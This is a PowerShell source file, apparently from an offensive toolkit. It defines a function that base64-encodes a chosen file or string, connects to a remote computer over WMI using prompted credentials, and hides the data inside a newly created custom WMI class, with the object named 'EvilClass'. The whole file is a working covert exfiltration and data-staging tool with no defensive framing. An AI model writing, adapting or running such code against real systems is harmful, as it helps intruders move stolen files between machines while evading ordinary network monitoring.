function Send-InfoWMI {

[CmdletBinding()]
param (

    [Parameter(Position = 0, Mandatory = $false)]
    [String]
    $FileToSend,

    [Parameter(Position = 1, Mandatory = $false)]
    $DataToSend,

    [Parameter(Position = 2, Mandatory = $false)]
    [String]
    $Username = $null,

    [Parameter(Position = 3, Mandatory = $false)]
    [String]
    $ComputerName,

    [Parameter(Position = 4, Mandatory = $false)]
    [String]
    $WmiNamespaceName = 'root\cimv2',
    
    [Parameter(Position = 5, Mandatory = $false)]
    [String]
    $WmiClassName = 'win32_SendInfo',

    [Parameter(Position = 6, Mandatory = $false)]
    [String]
    $WmiPropertyName = 'info'

    )

    #Check if file or data is to be sent
    if ($FileToSend) 
    {
    
        $FileBytes = [IO.File]::ReadAllBytes($FileToSend)
        $EncodedData = [Convert]::ToBase64String($FileBytes)

    }
    elseif ($DataToSend)
    {
        $DataBytes = [Text.Encoding]::UTF8.GetBytes($DataToSend)
        $EncodedData = [Convert]::ToBase64String($DataBytes)
    }
    else
    {
        Write-Warning "No file or data specified."
    }

    #Request Password
    $Credential = $host.ui.PromptForCredential("Please enter password", "Please enter your username and password.", "$Username","")
    $creds = $Credential.GetNetworkCredential()
    $Password = $Creds.password


    # Establish remote WMI connection
    Write-Verbose "Creating connection to $ComputerName"
    $Options = New-Object Management.ConnectionOptions
    $Options.username = $Username
    $Options.Password = $Password
    $Options.EnablePrivileges = $true
    $Connection = New-Object Management.ManagementScope
    $Conpath = '\\' + $ComputerName + '\' + $WmiNamespaceName
    $Connection.Path = $Conpath
    $Connection.Options = $Options
    $Connection.Connect()

    # Push file contents
    Write-Verbose "Sending information to $ComputerName"
    $EvilClass = New-Object Management.ManagementClass($Connection, $null, $null)
    $EvilClass.Name = $WmiClassName
    $EvilClass.Properties.Add($WmiPropertyName, [Management.CimType]::String, $false)
    $EvilClass.Properties[$WmiPropertyname].Value = $EncodedData
    $EvilClass.Put()
}








